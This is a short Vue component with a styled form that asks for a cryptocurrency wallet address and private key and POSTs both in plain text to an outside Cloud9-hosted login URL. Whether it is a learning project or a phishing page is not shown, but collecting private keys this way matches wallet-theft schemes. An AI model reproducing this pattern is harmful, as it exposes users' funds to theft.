<template>
    <div>
      <form action="https://webtech-kashann.c9users.io/login" method="POST">
        <label for="address">Wallet Address:⠀</label>
        <input type="text" id="address" name="address" placeholder="Public Key..."/>
        <br>
        <label for="privateKey">Private Key:⠀⠀⠀</label>
        <input type="text" id="privateKey" name="privateKey" placeholder="Private Key..."/>
        <input type="submit" value="Submit">
      </form>
    </div>
</template>

<style>
input[type=text], select {
  width: 50%;
  padding: 12px 20px;
  margin: 8px 0;
  display: inline-block;
  border: 1px solid #ccc;
  border-radius: 4px;
}

input[type=submit] {
  width: 60%;
  background-color: #2693ba;
  color: white;
  padding: 14px 20px;
  margin: 8px 0;
  border: none;
  border-radius: 4px;
  cursor: pointer;
}

input[type=submit]:hover {
  background-color: #0481af;
}
</style>